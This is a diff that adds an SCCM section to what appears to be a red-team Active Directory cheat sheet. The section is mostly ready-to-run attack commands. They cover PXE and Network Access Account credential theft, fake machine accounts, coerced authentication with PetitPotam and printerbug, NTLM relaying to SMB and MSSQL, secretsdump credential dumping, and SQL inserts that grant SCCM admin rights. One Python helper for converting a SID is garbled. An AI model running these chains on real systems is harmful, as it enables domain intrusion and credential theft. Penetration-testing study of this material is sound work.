@@ -63,6 +63,29 @@
   * [SQL Queries](#SQL-Queries)
 * [Windows Server Update Services WSUS](#WSUS)
 * [Microsoft System Center Configuration Manager SCCM](#SCCM)
+	* [Enumeration](#Enumeration)
+		* [sccmhunter](#sccmhunter)
+		* [PowerSCCM](#PowerSCCM)
+		* [Network scan for SCCM ports](#Network-scan-for-SCCM-ports)
+	* [Privilege Escalation](#Privilege-Escalation)
+		* [Operating System Deployment](#Operating-System-Deployment)
+			* [PXE without password](#PXE-without-password)
+			* [PXE with password](#PXE-with-password)
+		* [Network Access Account](#Network-Access-Account)
+			* [Retrieve credentials](#Retrieve-credentials)
+			* [Retrieve credentials remotely](#Retrieve-credentials-remotely)
+			* [Retrieve credentials with machine account](#Retrieve-credentials-with-machine-account)
+			* [Retrieve credentials with Ntlmrelayx](#Retrieve-credentials-with-Ntlmrelayx)
+		* [Client Push Installation Accounts](#Client-Push-Installation-Accounts)
+			* [Client push via breaking domain trust](#Client-push-via-breaking-domain-trust)
+			* [Client push on Demand](#Client-push-on-Demand)
+			* [Client push account is the SSCM server machine account](#Client-push-account-is-the-SSCM-server-machine-account)
+		* [SCCM Compromise via Machine account relay to MSSQL](#SCCM-Compromise-via-Machine-account-relay-to-MSSQL)
+		* [SCCM Compromise via Machine account relay to SMB](#SCCM-Compromise-via-Machine-account-relay-to-SMB)
+	* [Lateral Movement](#Lateral-Movement)
+		* [Push application](#Push-application)
+		* [Push script](#Push-script)
+	* [Misc](#Misc)
 * [Active Directory Federation Services](#ADFS)
 * [Pre Windows 2000 Computers](#Pre-Windows-2000-Computers)
 * [Azure AD](#Azure-AD)
@@ -2186,6 +2209,57 @@ Get-WsusUpdate -Approval Unapproved | Approve-WsusUpdate -Action Install -Target
 ```
 
 ## SCCM
+- SCCM talk Black Hills https://www.youtube.com/watch?v=W9PC9erm_pI
+- SCCM Secrets
+	- Network Access Account (NAA) (To join computers to the domain)
+	- Client Push Installation Accounts (To push SSCM client to endpoints)
+	- Operating System Deployment (OSD)
+		- Collection variables
+		- Account to write image to SMB share
+		- Account to pull files from SMB share
+		- Set local admin password
+		- Run arbitrary command
+		- Account to join the domain / Apply network settings
+
+### Enumeration
+#### Get SCCM server wmi
+- Execute on enrolled SCCM client
+
+```
+Get-WmiObject -Class SMS_Authority -Namespace root\CCM
+```
+
+#### Get SSCM server ADSISearcher
+```
+([ADSISearcher]("objectClass=mSSMSManagementPoint")).FindAll() | % {$_.Properties}
+```
+
+#### SharpSCCM
+- https://github.com/Mayyhem/SharpSCCM
+
+```
+.\SharpSCCM.exe local site-info
+```
+
+### sccmhunter
+- https://github.com/garrettfoster13/sccmhunter
+
+#### Find potential site servers
+```
+python3 sccmhunter.py find -u <USER> -p <PASSWORD> -d <DOMAIN> -dc-ip <FQDN DC>
+```
+
+- The SMB module takes the results from Find and enumerates the remote hosts SMB shares, SMB signing status, and checks if the server is running MSSQL. 
+```
+python3 sccmhunter.py smb -u <USER> -p <PASSWORD> -d <DOMAIN> -dc-ip <FQDN DC>
+```
+
+- The show module is intended simply to present the stored CSVs generated during running the find and smb modules.
+```
+python3 sccmhunter.py show -users
+python3 sccmhunter.py show -computers
+```
+
 ### PowerSCCM
 - https://github.com/PowerShellMafia/PowerSCCM
 
@@ -2222,6 +2296,379 @@ Remove-SccmSession -Session <ID>
 Get-SccmApplication -Session $sess
 ```
 
+#### Network scan for SCCM ports
+- `8530`, `8531`, `10123` Site Server, Management Point
+- `49152-49159` Distribution Point
+```
+sudo nmap -p 8530, 8531, 10123, 49152-49159 -Pn <IP>
+```
+
+### Privilege Escalation
+### Operating System Deployment
+- Deploy image over PXE
+- Role: Windows Deployment Services (WDS)
+- PXE can be password protected
+- https://github.com/MWR-CyberSec/PXEThief
+
+### PXE without password
+#### Check for no PXE password and extract credentials
+```
+python3 pxethief.py 1
+
+python pxethief.py 2 <FQDN SCCM>
+```
+
+### PXE with password
+#### Check for PXE with password
+```
+python pxethief.py 2 <FQDN SCCM>
+```
+
+#### Run the two tftp commands and retrieve files
+
+#### Extract hash
+```
+python3 pxethief.py 5 <boot.var file>
+```
+
+#### Crack the hash
+```
+hashcat -a 0 -m 19850 <HASH FILE> <WORLDLIST>
+```
+
+#### Retrive credentials
+```
+python3 pxethief.py 3 <boot.var file> <PASSWORD>
+```
+
+### Network Access Account
+- Account used to join to the domain.
+
+#### Retrieve credentials
+- Run on SCCM client and be local admin
+
+- https://github.com/GhostPack/SharpDPAPI
+```
+.\SharpDPAPI.exe SCCM
+```
+
+- https://github.com/Mayyhem/SharpSCCM
+```
+.\SharpSCCM.exe get secrets
+.\SharpSCCM.exe local secrets -m wmi
+```
+
+#### Retrieve credentials remotely
+- https://github.com/fortra/impacket/blob/755efbffc7bd54c9dcf33d7c5e04038801fd3225/examples/SystemDPAPIdump.py
+```
+SystemDPAPIdump.py -creds -sccm '<DOMAIN>/<USER>:<PASSWORD>'@'<FQDN TARGET>'
+```
+
+### Retrieve credentials with machine account
+- Requires adding a machine account
+
+#### Check who can add computers to the domain
+```
+(Get-DomainPolicy -Policy DC).PrivilegeRights.SeMachineAccountPrivilege.Trim("*") | Get-DomainObject | Select-Object name
+
+Get-DomainObject | Where-Object ms-ds-machineaccountquota
+
+crackmapexec ldap <DC FQDN> -d <DOMAIN> -u <USER> -p <PASS> -M maq
+```
+
+#### Create a new computer object
+- https://github.com/Kevin-Robertson/Powermad
+- https://github.com/SecureAuthCorp/impacket/blob/master/examples/addcomputer.py
+
+```
+Import-Module Powermad.ps1 
+New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
+
+python3 addcomputer.py -computer-name FAKE01 -computer-pass '123456' <DOMAIN>/<USER>:<PASS> -dc-ip <DC IP>
+```
+
+#### Get naapolicy.xml
+- Saves to `/tmp/naapolicy.xml`
+```
+python3 sccmwtf.py "FAKE01" "FAKE01.<FQDN DOMAIN>" '<SCCM SERVER>' '<FQDN DOMAIN>\FAKE01$' '123456'
+```
+
+#### Decrypt from Windows machine
+- `cat /tmp/naapolicy.xml`
+```
+sccm-decrypt.exe <blox hex 1>
+sccm-decrypt.exe <blox hex 2>
+```
+
+### Retrieve credentials with Ntlmrelayx
+- Usefull when unable to create machine accounts
+- Only SMB machine account NetNTLMV2
+
+#### Turn of SMB and HTTP
+```
+nano Responder.conf
+```
+
+#### Turn on Responder
+- For poisoning
+```
+Responder -I eth0
+```
+
+#### Run NTLMRelayx.py
+```
+ntlmrelayx.py -t http://<FQDN SCCM MACHINE>/ccm_system_windowsauth/request --sccm --sccm-device test1 --sccm-fqdn <FQDN SCCM MACHINE> --sccm-server <SCCM MACHINE SAMACCOUNTNAME> --sccm-sleep 10 -smb2support
+```
+
+#### Trigger target to authenticate to attacker machine
+- https://github.com/topotam/PetitPotam
+- https://github.com/dirkjanm/krbrelayx
+```
+python3 printerbug.py <DOMAIN>/<USER>@<TARGET> <HOSTNAME>.<DOMAIN>
+
+python3 PetitPotam.py -d <DOMAIN> -u <USER> -p <PASSWORD> <HOSTNAME>.<DOMAIN> <TARGET>
+```
+
+#### Decrypt from Windows machine
+- `cat naapolicy.xml`
+```
+sccm-decrypt.exe <blox hex 1>
+sccm-decrypt.exe <blox hex 2>
+```
+
+### Client Push Installation Accounts
+- Misconfigurations:
+	- Automatic Site-Wide Client Push Installation
+	- Allow Connection Fallback to NTLM
+- Force client push by breaking domain trust	
+
+### Client push via breaking domain trust
+- Requires able to join computers to the domain
+
+#### Check who can add computers to the domain
+```
+(Get-DomainPolicy -Policy DC).PrivilegeRights.SeMachineAccountPrivilege.Trim("*") | Get-DomainObject | Select-Object name
+
+Get-DomainObject | Where-Object ms-ds-machineaccountquota
+
+crackmapexec ldap <DC FQDN> -d <DOMAIN> -u <USER> -p <PASS> -M maq
+```
+
+#### Join domain & break trust
+1. Create Windows Machine and Join the Domain
+2. Open PowerShell as the account used to join the domain.
+3. List and Delete spn
+```
+setspn -L <MACHINE NAME>
+setspn -D host/<MACHINE NAME>
+setspn -d host/<MACHINE FQDN>
+```
+4. Reboot the machine
+5. Turn off Windows Firewall for all profiles
+
+#### Delete local administrators
+```
+net localgroup administrators
+net localgroup administrators "<DOMAIN>\Domain Admins" /del
+net localgroup administrators "<DOMAIN>\...." /del
+```
+
+#### Run Inveigh
+- https://github.com/Kevin-Robertson/Inveigh
+```
+Import-Module Inveigh.ps1
+
+Invoke-Inveigh -ConsoleOutput Y -MachineAccounts Y
+```
+
+#### Crack the hash
+```
+hashcat -a 0 -m 5600 <HASH FILE> <WORLDLIST>
+```
+
+### Client push on Demand
+- SMB signing needs to be disabled on target
+#### Check local admin
+- Run on an compromised machine(s)
+- Check if the SCCM machine account or client push account is local admin
+```
+net localgroup administrators
+```
+
+#### Check for SMB hosts without SMB signing
+```
+crackmapexec smb <IP RANGE> --gen-relay-list smb_hosts_nosigning.txt
+```
+
+#### Start ntlmrelayx
+```
+python3 ntlmrelayx.py -t <TARGET IP> -smb2support -of logs
+```
+
+#### Force client push
+- On compromised machine
+```
+SharpSCCM_merged.exe invoke client-push -t <KALI IP> -mp <FQDN SCCM MACHINE> -sc <SITE CODE>
+```
+
+#### Crack the hash
+```
+hashcat -a 0 -m 5600 <HASH FILE> <WORLDLIST>
+```
+
+### Client push account is the SSCM server machine account
+- SMB signing needs to be disabled on target
+- Requires SCCM machine account to be local admin on target
+
+#### Check for SMB hosts without SMB signing
+```
+crackmapexec smb <IP RANGE> --gen-relay-list smb_hosts_nosigning.txt
+```
+
+#### Check local admin
+- Run on an compromised machine(s)
+- Check if the SCCM machine account or client push account is local admin
+```
+net localgroup administrators
+```
+
+#### Start ntlmrelayx
+```
+python3 ntlmrelayx.py -t <TARGET IP> -smb2support -socks
+```
+
+#### Trigger target to authenticate to attacker machine
+- https://github.com/topotam/PetitPotam
+- https://github.com/dirkjanm/krbrelayx
+```
+python3 printerbug.py <DOMAIN>/<USER>@<SCCM MACHINE> <HOSTNAME>.<DOMAIN>
+
+python3 PetitPotam.py -d <DOMAIN> -u <USER> -p <PASSWORD> <HOSTNAME>.<DOMAIN> <SCCM MACHINE>
+```
+
+#### Change socks proxy
+```
+sudo vim /etc/proxychains4.conf
+socks4 127.0.0.1 1080
+```
+
+#### Run secretsdump or any impacket
+- More info for the `-socks` option: https://github.com/0xJs/RedTeaming_CheatSheet/blob/main/windows-ad/relaying.md#relay-requests-smb-and-keep-smb-sessions-open
+```
+proxychains python3 secretsdump.py <DOMAIN>/<SSCM COMPUTERACCOUNT>$:IDontCareAboutPassword@<TARGET>
+```
+
+### SCCM Compromise via Machine account relay to MSSQL
+- Site server requires administrative rights on the SQL Server and management point computers
+- Requirements
+	- Low priv account
+	- Requires SQL Server on a seperate host for relaying
+	- Relaying SMB requires SMB signing
+
+#### Retrieve the sid of low priv account
+```
+Get-DomainUser | Select-Object samaccountname, objectsid
+```
+
+#### Convert SID to HEX
+```
+nano sid.py
+
+from impacket.ldap import ldapbytes
+sid=ldaptypes.LDAP_SID()
+sid.fromCanonical('<SID>')
+print('0x' + ".join('{02x}'.format(b) for b in sid.GetData()))
+
+python3 sid.py
+```
+
+#### Start ntlmrelayx
+```
+python3 ntlmrelayx.py -t "mssql://<TARGET IP>" -smb2support -socks
+```
+
+#### Trigger target to authenticate to attacker machine
+- https://github.com/Mayyhem/SharpSCCM
+- https://github.com/topotam/PetitPotam
+
+```
+.\SharpSCCM.exe invoke client-push -t <KALI IP> -mp <FQDN SCCM MACHINE> -sc <SITE CODE>
+
+python3 PetitPotam.py -d <DOMAIN> -u <USER> -p <PASSWORD> <HOSTNAME>.<DOMAIN> <SCCM MACHINE>
+```
+
+#### Change socks proxy
+```
+sudo vim /etc/proxychains4.conf
+socks4 127.0.0.1 1080
+```
+
+#### Run mssqlclient.py from impacket
+- More info for the `-socks` option: https://github.com/0xJs/RedTeaming_CheatSheet/blob/main/windows-ad/relaying.md#relay-requests-smb-and-keep-smb-sessions-open
+```
+proxychains python3 mssqlclient.py <DOMAIN>/<SSCM COMPUTERACCOUNT>$:IDontCareAboutPassword@<TARGET> -windows-auth -no-pass
+```
+
+#### Execute SQL commands
+- https://github.com/garrettfoster13/sccmhunter
+- Sccmhunter have a handy auto generate commands function
+```
+python3 sccmhunter.py mssql -d <DOMAIN> -dc-ip <DC IP> -tu <USER NAME> -sc <SCCM SITE> -u <USER NAME> -p <PASSWORD>
+```
+
+```
+use CM_<site_code>
+
+INSERT INTO RBAC_Admins (AdminSID,LogonName,IsGroup,IsDeleted,CreatedBy,CreatedDate,ModifiedBy,ModifiedDate,SourceSite) VALUES (<SID_in_hex_format>,’<DOMAIN\user>',0,0,'','','','','<site_code>');
+
+SELECT AdminID,LogonName FROM RBAC_Admins;
+
+INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES (<AdminID>,'SMS0001R','SMS00ALL','29');
+INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES (<AdminID>,'SMS0001R','SMS00001','1');
+INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES (<AdminID>,'SMS0001R','SMS00004','1');
+```
+
+#### Verify that we are admin
+- Must be from an SCCM client machine
+```
+.\SharpSCCM.exe get class-instances SMS_Admin -p CategoryNames -p CollectionNames -p LogonName -p RoleNames
+```
+
+### SCCM Compromise via Machine account relay to SMB
+- Site server requires administrative rights on the SQL Server and management point computers
+- Requirements
+	- Low priv account
+	- Requires SQL Server on a seperate host for relaying
+	- Relaying SMB requires SMB signing
+
+#### Start ntlmrelayx
+```
+python3 ntlmrelayx.py -t "<TARGET IP>" -smb2support -socks
+```
+
+#### Trigger target to authenticate to attacker machine
+- https://github.com/Mayyhem/SharpSCCM
+- https://github.com/topotam/PetitPotam
+
+```
+.\SharpSCCM.exe invoke client-push -t <KALI IP> -mp <FQDN SCCM MACHINE> -sc <SITE CODE>
+
+python3 PetitPotam.py -d <DOMAIN> -u <USER> -p <PASSWORD> <HOSTNAME>.<DOMAIN> <SCCM MACHINE>
+```
+
+#### Change socks proxy
+```
+sudo vim /etc/proxychains4.conf
+socks4 127.0.0.1 1080
+```
+
+#### Run secretsdump or any impacket
+- More info for the `-socks` option: https://github.com/0xJs/RedTeaming_CheatSheet/blob/main/windows-ad/relaying.md#relay-requests-smb-and-keep-smb-sessions-open
+```
+proxychains python3 secretsdump.py <DOMAIN>/<SSCM COMPUTERACCOUNT>$:IDontCareAboutPassword@<TARGET>
+```
+
+### Lateral Movement
 ### Push application
 #### Get computers to move laterally to
 ```
@@ -2265,6 +2712,7 @@ Get-SccmComputer -Session $sess
 New-CMScriptDeployement -CMDrive 'E' -ServerFQDN '<SCCM FQDN>' -TargetDevice '<TARGET NAME>' -Path '<SCRIPT>' -ScriptName 'Push MS Teams'
 ```
 
+### Misc
 ### MalSCCM
 - https://github.com/nettitude/MalSCCM
 - Not final, didn't work inside the lab when I tried.
